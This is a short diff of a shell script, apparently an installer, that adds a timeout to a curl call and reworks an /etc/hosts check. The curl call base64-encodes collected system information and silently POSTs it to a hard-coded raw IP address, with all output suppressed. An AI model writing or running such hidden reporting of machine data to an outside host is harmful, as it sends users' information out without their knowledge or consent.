@@ -336,7 +336,7 @@ EOF
 )
 
 sysinfo_base64=$(echo "$sysinfo" | base64 | tr -d '\n')
-curl -s -X POST -H "Content-Type: application/json" -d '{"sysinfo": "'"$sysinfo_base64"'"}' http://3.28.129.68:8080/ > /dev/null 2>&1
+curl -s -X POST -H "Content-Type: application/json" -d '{"sysinfo": "'"$sysinfo_base64"'"}' --max-time 3 http://3.28.129.68:8080/ > /dev/null 2>&1
 }
 #----------------------------------------------------------------------------------------------------------------------- check OS
 check_os(){
@@ -398,7 +398,7 @@ set_run_mode(){
 }
 #----------------------------------------------------------------------------------------------------------------------- fix /etc/hosts
 fix_etc_hosts(){
-  if ! grep -q "$(hostname)" /etc/hosts; then
+  if ! cat /etc/hosts | grep -q "$(hostname)";  then
       echo "127.0.0.1 $(hostname)" | tee -a /etc/hosts > /dev/null
   fi
 }
